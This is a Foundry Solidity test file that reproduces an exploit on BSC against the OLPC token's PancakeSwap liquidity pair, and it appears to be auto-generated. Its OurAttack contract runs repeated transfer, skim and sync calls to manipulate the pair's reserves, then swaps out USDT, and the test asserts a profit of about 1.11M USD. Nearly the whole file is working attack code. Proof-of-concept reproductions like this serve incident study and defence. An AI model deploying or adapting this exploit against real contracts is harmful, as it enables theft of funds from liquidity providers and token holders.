// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x18d6c39ae9e537f948aa2212d44d8c23944fc188
// Attack Contract : 0x18d6c39ae9e537f948aa2212d44d8c23944fc188
// Vulnerable Contract : 0x18d6c39ae9e537f948aa2212d44d8c23944fc188
// Attack Tx : 0x8dabb60a94e5124462e5f494a25c14bcd52f6f4d1f7c665a249496f4c6c24764
// Block : 105326393
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 1.11M USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attack_contract;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 105326392;
    uint256 constant TX_TIMESTAMP = 1781955063;
    uint256 constant TX_BLOCK_NUMBER = 105326393;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        // Preserve the attacker contract address while using the readable runtime below.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.USDT, "USDT", 1115903663412131721557252);
    }
}

contract OurAttack {
    function attack() external payable {
        _manipulatePair();
    }

    function _manipulatePair() internal {
        IERC20Like olpc = IERC20Like(Addresses.OLPC);
        IPancakePair pair = IPancakePair(Addresses.Cake_LP_F365);

        olpc.transfer(Addresses.Cake_LP_F365, 1000000000000000000);
        pair.sync();

        uint256[20] memory stagedTransfers = [
            uint256(7087561),
            uint256(708756),
            uint256(70875),
            uint256(7087),
            uint256(708),
            uint256(70),
            uint256(7),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0)
        ];

        for (uint256 i = 0; i < stagedTransfers.length; i++) {
            _rebalancePair(olpc, pair, stagedTransfers[i]);
        }

        olpc.transfer(Addresses.Cake_LP_F365, 9000000000000000000);
        ISwapExecutor(Addresses.A_5DB85D_5CC0).swap(Addresses.OLPC, 0, 1, Addresses.USDT, address(this), 781328217393);
    }

    function _rebalancePair(IERC20Like olpc, IPancakePair pair, uint256 transferAmount) internal {
        olpc.balanceOf(Addresses.Cake_LP_F365);
        olpc.transfer(Addresses.Cake_LP_F365, transferAmount);
        pair.skim(Addresses.A_C0F1EF_755A);
        pair.sync();
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x2cadd184) {
            _manipulatePair();
            return;
        }
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant A_0E3CA1_3ACB = 0x0E3CA1c81B52ff4281d2CF5f7f2C693874783acb;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant attack_contract = 0x18D6c39aE9E537F948AA2212d44D8c23944fc188;
    address internal constant LABUBU = 0x3494dfE19b721DAC6c5c8d7470c8F89548177777;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant OLPC = 0x58815CDF9955121a6274680ab396a36FC9e00000;
    address internal constant A_5DB85D_5CC0 = 0x5DB85D56DA09f61BeC51386F1602ccf5BF555cc0;
    address internal constant A_76BE28_D34D = 0x76Be2866c837037CA1BfEF0a8228457139f9D34D;
    address internal constant A_A79FC9_168F = 0xa79Fc974e8EF605f153B80F42281CbB268cE168F;
    address internal constant A_AAC032_C60B = 0xAac03265447F65Aac18c27e5FFF651Ec7A29c60B;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant A_C0F1EF_755A = 0xc0F1Ef7FE2ae3AAD0175af192713d36eD151755a;
    address internal constant A_C9E882_7FC8 = 0xc9E8829426f369fa08Be90375d1288283e497fc8;
    address internal constant Cake_LP_C421 = 0xdfACdC33e913710ead31eE40F9c5363Ea673C421;
    address internal constant Cake_LP_F365 = 0xedB7DCB4cDFEc957F8Df5cBf5E94229a6CC9F365;
    address internal constant IB = 0xf7397aC512599Ea3a95AE561b33Cf430C63572f8;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IPancakePair {
    function skim(address) external;
    function sync() external;
}

interface ISwapExecutor {
    function swap(address, uint256, uint256, address, address, uint256) external returns (uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}
